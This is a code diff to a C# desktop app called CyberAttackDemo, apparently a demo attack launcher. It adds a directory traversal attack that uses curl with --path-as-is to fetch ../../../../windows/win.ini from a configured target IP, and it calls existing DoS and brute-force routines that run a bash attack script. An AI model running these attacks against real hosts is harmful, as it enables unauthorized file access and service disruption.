@@ -77,6 +77,7 @@ namespace CyberAttackDemo
             if (Phase1Panel != null) Phase1Panel.IsVisible = false;
             if (Phase2Panel != null) Phase2Panel.IsVisible = true;
             
+            // UI有効化（古いボタンではなくコンボボックス等を有効化）
             if (AttackSelector != null) AttackSelector.IsEnabled = true;
             if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
             
@@ -92,6 +93,7 @@ namespace CyberAttackDemo
 
             if (selectedIndex == 0) await RunDosAttack();
             else if (selectedIndex == 1) await RunBruteForce();
+            else if (selectedIndex == 2) await RunDirectoryTraversal();
         }
 
         // --- DoS攻撃 ---
@@ -107,7 +109,6 @@ namespace CyberAttackDemo
             await _engine.EnsureAttackScriptExistsAsync();
 
             string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} dos";
-            // タイムアウト時間を渡して強制終了を有効化
             await _engine.RunCommandAsync("bash", args, _config.DdosDuration);
 
             WriteLog("\n[ATTACK STOPPED] SHELL SCRIPT TERMINATED.");
@@ -128,6 +129,28 @@ namespace CyberAttackDemo
             SetBusyState(false, "READY FOR NEXT COMMAND.");
         }
 
+        // --- ディレクトリトラバーサル (実攻撃) ---
+        private async Task RunDirectoryTraversal()
+        {
+            SetBusyState(true, "EXECUTING PATH TRAVERSAL...", Avalonia.Media.Brushes.Red);
+            WriteLog("\n==========================================");
+            WriteLog($"[*] INITIATING DIRECTORY TRAVERSAL ATTACK (ACTUAL)...");
+            WriteLog("[*] TARGET: Windows IIS (Assumed)");
+            WriteLog("[*] PAYLOAD: ../../../../windows/win.ini");
+            WriteLog("==========================================");
+
+            string targetUrl = $"http://{_config.TargetIp}/../../../../windows/win.ini";
+            string args = $"--path-as-is -v --max-time 5 \"{targetUrl}\"";
+            
+            WriteLog($"[*] Executing: curl {args}");
+            
+            await _engine.RunCommandAsync("curl", args, 10);
+
+            WriteLog("\n[ATTACK FINISHED] Response received (or blocked by IDS).");
+            SetBusyState(false, "READY FOR NEXT COMMAND.");
+        }
+
+        // --- リセット ---
         private void OnResetClick(object sender, RoutedEventArgs e)
         {
             if (LogOutput != null) LogOutput.Text = "";
@@ -142,19 +165,21 @@ namespace CyberAttackDemo
             WriteLog("SYSTEM RESET. READY.");
         }
 
+        // --- UI Helper Methods ---
+        // ここを修正: 古いボタン参照を削除し、新しいUI要素を制御
         private void SetBusyState(bool isBusy, string statusText, Avalonia.Media.IBrush? color = null)
         {
             if (isBusy)
             {
+                if (ScanButton != null) ScanButton.IsEnabled = false;
                 if (ExecuteButton != null) ExecuteButton.IsEnabled = false;
                 if (AttackSelector != null) AttackSelector.IsEnabled = false;
-                if (ScanButton != null) ScanButton.IsEnabled = false;
             }
             else
             {
+                if (ScanButton != null) ScanButton.IsEnabled = true;
                 if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
                 if (AttackSelector != null) AttackSelector.IsEnabled = true;
-                if (ScanButton != null) ScanButton.IsEnabled = true;
             }
             UpdateStatus(statusText, color);
         }
